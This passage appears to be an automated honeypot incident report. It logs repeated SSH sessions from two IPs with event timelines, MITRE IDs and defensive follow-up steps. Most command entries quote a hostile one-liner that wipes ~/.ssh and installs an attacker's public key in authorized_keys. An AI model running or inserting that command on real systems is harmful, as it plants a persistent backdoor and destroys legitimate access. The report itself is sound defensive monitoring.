| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:09 |
| **Last Seen** | 2026-04-24 14:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:09:27` | `cowrie.session.connect` |
| `2026-04-24 14:09:27` | `cowrie.client.version` |
| `2026-04-24 14:09:27` | `cowrie.client.kex` |
| `2026-04-24 14:09:27` | `cowrie.login.success` |
| `2026-04-24 14:09:28` | `cowrie.session.params` |
| `2026-04-24 14:09:28` | `cowrie.command.input` |
| `2026-04-24 14:09:28` | `cowrie.command.failed` |
| `2026-04-24 14:09:28` | `cowrie.log.closed` |
| `2026-04-24 14:09:28` | `cowrie.session.params` |
| `2026-04-24 14:09:28` | `cowrie.command.input` |
| `2026-04-24 14:09:29` | `cowrie.session.file_download` |
| `2026-04-24 14:09:29` | `cowrie.log.closed` |
| `2026-04-24 14:09:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92bc40db358d

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:09 |
| **Last Seen** | 2026-04-24 14:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:09:31` | `cowrie.session.connect` |
| `2026-04-24 14:09:31` | `cowrie.client.version` |
| `2026-04-24 14:09:31` | `cowrie.client.kex` |
| `2026-04-24 14:09:32` | `cowrie.login.success` |
| `2026-04-24 14:09:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-044e2f77cd01

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:09 |
| **Last Seen** | 2026-04-24 14:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:09:48` | `cowrie.session.connect` |
| `2026-04-24 14:09:48` | `cowrie.client.version` |
| `2026-04-24 14:09:48` | `cowrie.client.kex` |
| `2026-04-24 14:09:49` | `cowrie.login.success` |
| `2026-04-24 14:09:50` | `cowrie.session.params` |
| `2026-04-24 14:09:50` | `cowrie.command.input` |
| `2026-04-24 14:09:50` | `cowrie.command.failed` |
| `2026-04-24 14:09:50` | `cowrie.log.closed` |
| `2026-04-24 14:09:51` | `cowrie.session.params` |
| `2026-04-24 14:09:51` | `cowrie.command.input` |
| `2026-04-24 14:09:51` | `cowrie.session.file_download` |
| `2026-04-24 14:09:51` | `cowrie.log.closed` |
| `2026-04-24 14:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-872cbc7eac4f

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:09 |
| **Last Seen** | 2026-04-24 14:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:09:54` | `cowrie.session.connect` |
| `2026-04-24 14:09:54` | `cowrie.client.version` |
| `2026-04-24 14:09:54` | `cowrie.client.kex` |
| `2026-04-24 14:09:56` | `cowrie.login.success` |
| `2026-04-24 14:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e7ad580178e

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:10 |
| **Last Seen** | 2026-04-24 14:10 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:10:36` | `cowrie.session.connect` |
| `2026-04-24 14:10:36` | `cowrie.client.version` |
| `2026-04-24 14:10:36` | `cowrie.client.kex` |
| `2026-04-24 14:10:37` | `cowrie.login.success` |
| `2026-04-24 14:10:37` | `cowrie.session.params` |
| `2026-04-24 14:10:37` | `cowrie.command.input` |
| `2026-04-24 14:10:37` | `cowrie.command.failed` |
| `2026-04-24 14:10:37` | `cowrie.log.closed` |
| `2026-04-24 14:10:38` | `cowrie.session.params` |
| `2026-04-24 14:10:38` | `cowrie.command.input` |
| `2026-04-24 14:10:38` | `cowrie.session.file_download` |
| `2026-04-24 14:10:38` | `cowrie.log.closed` |
| `2026-04-24 14:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f83bb477dee

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:10 |
| **Last Seen** | 2026-04-24 14:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:10:40` | `cowrie.session.connect` |
| `2026-04-24 14:10:40` | `cowrie.client.version` |
| `2026-04-24 14:10:41` | `cowrie.client.kex` |
| `2026-04-24 14:10:41` | `cowrie.login.success` |
| `2026-04-24 14:10:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d02dfa84e6b5

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:10 |
| **Last Seen** | 2026-04-24 14:10 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:10:44` | `cowrie.session.connect` |
| `2026-04-24 14:10:44` | `cowrie.client.version` |
| `2026-04-24 14:10:45` | `cowrie.client.kex` |
| `2026-04-24 14:10:46` | `cowrie.login.success` |
| `2026-04-24 14:10:46` | `cowrie.session.params` |
| `2026-04-24 14:10:46` | `cowrie.command.input` |
| `2026-04-24 14:10:46` | `cowrie.command.failed` |
| `2026-04-24 14:10:47` | `cowrie.log.closed` |
| `2026-04-24 14:10:47` | `cowrie.session.params` |
| `2026-04-24 14:10:47` | `cowrie.command.input` |
| `2026-04-24 14:10:47` | `cowrie.session.file_download` |
| `2026-04-24 14:10:47` | `cowrie.log.closed` |
| `2026-04-24 14:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b16268235d7

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:10 |
| **Last Seen** | 2026-04-24 14:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:10:51` | `cowrie.session.connect` |
| `2026-04-24 14:10:51` | `cowrie.client.version` |
| `2026-04-24 14:10:51` | `cowrie.client.kex` |
| `2026-04-24 14:10:52` | `cowrie.login.success` |
| `2026-04-24 14:10:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb7699e9b04f

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:11 |
| **Last Seen** | 2026-04-24 14:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:11:45` | `cowrie.session.connect` |
| `2026-04-24 14:11:45` | `cowrie.client.version` |
| `2026-04-24 14:11:45` | `cowrie.client.kex` |
| `2026-04-24 14:11:45` | `cowrie.login.success` |
| `2026-04-24 14:11:46` | `cowrie.session.params` |
| `2026-04-24 14:11:46` | `cowrie.command.input` |
| `2026-04-24 14:11:46` | `cowrie.command.failed` |
| `2026-04-24 14:11:46` | `cowrie.log.closed` |
| `2026-04-24 14:11:46` | `cowrie.session.params` |
| `2026-04-24 14:11:46` | `cowrie.command.input` |
| `2026-04-24 14:11:47` | `cowrie.session.file_download` |
| `2026-04-24 14:11:47` | `cowrie.log.closed` |
| `2026-04-24 14:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0b98dec1c68

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:11 |
| **Last Seen** | 2026-04-24 14:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:11:49` | `cowrie.session.connect` |
| `2026-04-24 14:11:49` | `cowrie.client.version` |
| `2026-04-24 14:11:49` | `cowrie.client.kex` |
| `2026-04-24 14:11:50` | `cowrie.login.success` |
| `2026-04-24 14:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e7a873bfcdd

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:12 |
| **Last Seen** | 2026-04-24 14:12 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:12:38` | `cowrie.session.connect` |
| `2026-04-24 14:12:38` | `cowrie.client.version` |
| `2026-04-24 14:12:38` | `cowrie.client.kex` |
| `2026-04-24 14:12:39` | `cowrie.login.success` |
| `2026-04-24 14:12:40` | `cowrie.session.params` |
| `2026-04-24 14:12:40` | `cowrie.command.input` |
| `2026-04-24 14:12:40` | `cowrie.command.failed` |
| `2026-04-24 14:12:40` | `cowrie.log.closed` |
| `2026-04-24 14:12:41` | `cowrie.session.params` |
| `2026-04-24 14:12:41` | `cowrie.command.input` |
| `2026-04-24 14:12:41` | `cowrie.session.file_download` |
| `2026-04-24 14:12:41` | `cowrie.log.closed` |
| `2026-04-24 14:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c44d1f884c1

| Field | Detail |
|---|---|
| **Source IP** | `209.38.69[.]153` |
| **First Seen** | 2026-04-24 14:12 |
| **Last Seen** | 2026-04-24 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:12:44` | `cowrie.session.connect` |
| `2026-04-24 14:12:44` | `cowrie.client.version` |
| `2026-04-24 14:12:44` | `cowrie.client.kex` |
| `2026-04-24 14:12:46` | `cowrie.login.success` |
| `2026-04-24 14:12:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.38.69[.]153` to AbuseIPDB if not already reported
- [ ] Block `209.38.69[.]153` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26b2dbd51c99

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:12 |
| **Last Seen** | 2026-04-24 14:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:12:50` | `cowrie.session.connect` |
| `2026-04-24 14:12:50` | `cowrie.client.version` |
| `2026-04-24 14:12:50` | `cowrie.client.kex` |
| `2026-04-24 14:12:51` | `cowrie.login.success` |
| `2026-04-24 14:12:51` | `cowrie.session.params` |
| `2026-04-24 14:12:51` | `cowrie.command.input` |
| `2026-04-24 14:12:51` | `cowrie.command.failed` |
| `2026-04-24 14:12:52` | `cowrie.log.closed` |
| `2026-04-24 14:12:52` | `cowrie.session.params` |
| `2026-04-24 14:12:52` | `cowrie.command.input` |
| `2026-04-24 14:12:52` | `cowrie.session.file_download` |
| `2026-04-24 14:12:52` | `cowrie.log.closed` |
| `2026-04-24 14:12:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e3612c7818

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:12 |
| **Last Seen** | 2026-04-24 14:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:12:54` | `cowrie.session.connect` |
| `2026-04-24 14:12:54` | `cowrie.client.version` |
| `2026-04-24 14:12:55` | `cowrie.client.kex` |
| `2026-04-24 14:12:55` | `cowrie.login.success` |
| `2026-04-24 14:12:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-35e9a07c3537

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:13 |
| **Last Seen** | 2026-04-24 14:13 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:13:53` | `cowrie.session.connect` |
| `2026-04-24 14:13:53` | `cowrie.client.version` |
| `2026-04-24 14:13:53` | `cowrie.client.kex` |
| `2026-04-24 14:13:54` | `cowrie.login.success` |
| `2026-04-24 14:13:54` | `cowrie.session.params` |
| `2026-04-24 14:13:54` | `cowrie.command.input` |
| `2026-04-24 14:13:54` | `cowrie.command.failed` |
| `2026-04-24 14:13:54` | `cowrie.log.closed` |
| `2026-04-24 14:13:55` | `cowrie.session.params` |
| `2026-04-24 14:13:55` | `cowrie.command.input` |
| `2026-04-24 14:13:55` | `cowrie.session.file_download` |
| `2026-04-24 14:13:55` | `cowrie.log.closed` |
| `2026-04-24 14:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-553c99a4da5c

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:13 |
| **Last Seen** | 2026-04-24 14:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:13:57` | `cowrie.session.connect` |
| `2026-04-24 14:13:57` | `cowrie.client.version` |
| `2026-04-24 14:13:57` | `cowrie.client.kex` |
| `2026-04-24 14:13:58` | `cowrie.login.success` |
| `2026-04-24 14:13:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.146.202[.]174` to AbuseIPDB if not already reported
- [ ] Block `103.146.202[.]174` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69dc0fadf5d7

| Field | Detail |
|---|---|
| **Source IP** | `103.146.202[.]174` |
| **First Seen** | 2026-04-24 14:17 |
| **Last Seen** | 2026-04-24 14:17 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-24 14:17:10` | `cowrie.session.connect` |
